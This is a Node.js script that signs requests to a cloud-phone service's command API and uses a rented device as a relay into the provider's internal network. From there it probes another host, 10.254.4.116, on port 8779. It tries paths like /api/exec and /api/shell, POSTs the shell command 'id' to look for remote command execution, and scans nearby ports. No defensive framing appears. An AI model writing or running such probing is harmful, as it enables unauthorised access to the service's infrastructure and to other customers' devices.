const https = require('https');
const crypto = require('crypto');

// Config
const { AK, SK, HOST, SVC, CT } = require('../shared/vmos_api');
const SH = 'content-type;host;x-content-sha256;x-date';

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8);
  const xs = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = [`host:${HOST}`, `x-date:${xd}`, `content-type:${CT}`, `signedHeaders:${SH}`, `x-content-sha256:${xs}`].join('\n');
  const hc = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = ['HMAC-SHA256', xd, `${sd}/${SVC}/request`, hc].join('\n');
  const kd = crypto.createHmac('sha256', Buffer.from(SK, 'utf8')).update(sd).digest();
  const ks = crypto.createHmac('sha256', kd).update(SVC).digest();
  const sk2 = crypto.createHmac('sha256', ks).update('request').digest();
  const sig = crypto.createHmac('sha256', sk2).update(sts).digest('hex');
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SH}, Signature=${sig}` };
}

function apiPost(p, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {});
    const h = sign(b);
    const buf = Buffer.from(b, 'utf8');
    const req = https.request({ hostname: HOST, path: p, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 30) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c);
      res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 500) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', () => ok({ code: -99 }));
    req.write(buf); req.end();
  });
}

async function relay(cmd) {
  const r = await apiPost('/vcpcloud/api/padApi/syncCmd', { padCode: 'ACP250923JS861KJ', scriptContent: cmd });
  if (r.code !== 200) return { ok: false, out: `[API ${r.code}: ${r.msg || ''}]` };
  const it = (Array.isArray(r.data) ? r.data : [r.data])[0] || {};
  return { ok: it.taskStatus === 3, out: (it.errorMsg || it.taskResult || '').trim() };
}

async function probeAgent() {
  console.log('=== PROBING AGENT API ON 10.254.4.116:8779 ===');
  
  const endpoints = [
    '/',
    '/api',
    '/api/v1',
    '/api/cmd',
    '/api/exec',
    '/api/shell',
    '/api/system',
    '/api/info',
    '/cmd',
    '/exec',
    '/shell',
    '/system',
    '/info',
    '/status',
    '/ping'
  ];
  
  for (const ep of endpoints) {
    const r = await relay(`curl -s -m3 "http://10.254.4.116:8779${ep}" 2>/dev/null | head -c 200`);
    if (r.ok && r.out.length > 5 && !r.out.includes('timeout') && !r.out.includes('TIMEOUT')) {
      console.log(`  ${ep}: ${r.out.slice(0, 100)}`);
    }
  }
  
  // Also try POST to some endpoints
  console.log('\n=== POST TESTS ===');
  const postTests = [
    { url: '/api/cmd', data: '{"command":"id"}' },
    { url: '/api/exec', data: '{"cmd":"id"}' },
    { url: '/cmd', data: 'id' },
  ];
  
  for (const test of postTests) {
    const r = await relay(`curl -s -X POST -H "Content-Type: application/json" -d '${test.data}' "http://10.254.4.116:8779${test.url}" 2>/dev/null | head -c 200`);
    if (r.ok && r.out.length > 5) {
      console.log(`  POST ${test.url}: ${r.out.slice(0, 100)}`);
    }
  }
  
  // Try to see if there's a specific protocol
  console.log('\n=== PROTOCOL DISCOVERY ===');
  
  // Check if it's the same as our local agent
  const localAgent = await relay('curl -s "http://127.0.0.1:8779/" 2>/dev/null | head -c 200');
  console.log(`Local agent: ${localAgent.out.slice(0, 100)}`);
  
  // Try with different ports
  const ports = [8780, 8781, 8778, 9000, 9001];
  for (const port of ports) {
    const r = await relay(`curl -s -m2 "http://10.254.4.116:${port}/" 2>/dev/null | head -c 100`);
    if (r.ok && r.out.length > 5) {
      console.log(`  Port ${port}: ${r.out.slice(0, 100)}`);
    }
  }
}

probeAgent().catch(console.error);
